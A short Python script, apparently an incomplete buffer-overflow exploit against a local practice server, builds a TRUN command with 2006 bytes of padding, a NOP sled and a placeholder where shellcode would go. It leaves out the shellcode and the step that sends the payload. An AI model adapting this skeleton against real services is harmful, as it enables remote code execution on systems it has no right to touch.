
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("127.0.0.1", 9999))
buff = b'\x41' * 2006  # Prefix with 'b' to designate a bytes object
shellcode = b'...'  # Shellcode should also be a bytes object
nop = b'\x90' * 16

# Shellcode not included in this test. Trying to find out why NOP sled isn't being passed correctly.
overflow = b'TRUN .' + buff
